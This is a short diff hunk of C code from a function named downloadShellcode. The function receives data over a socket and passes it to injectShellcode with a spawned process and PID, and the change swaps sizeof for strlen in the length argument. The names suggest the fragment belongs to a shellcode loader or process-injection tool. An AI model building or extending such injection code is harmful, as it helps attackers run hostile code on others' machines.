@@ -35,6 +35,6 @@ int downloadShellcode(SOCKET ClientSocket) {
 	int PID = 0;
 	BOOL unsafe = false;
 
-	injectShellcode(spawnProc, PID, unsafe, shellcode,sizeof(shellcode));
+	injectShellcode(spawnProc, PID, unsafe, shellcode,strlen(shellcode));
 	return 0;
 }
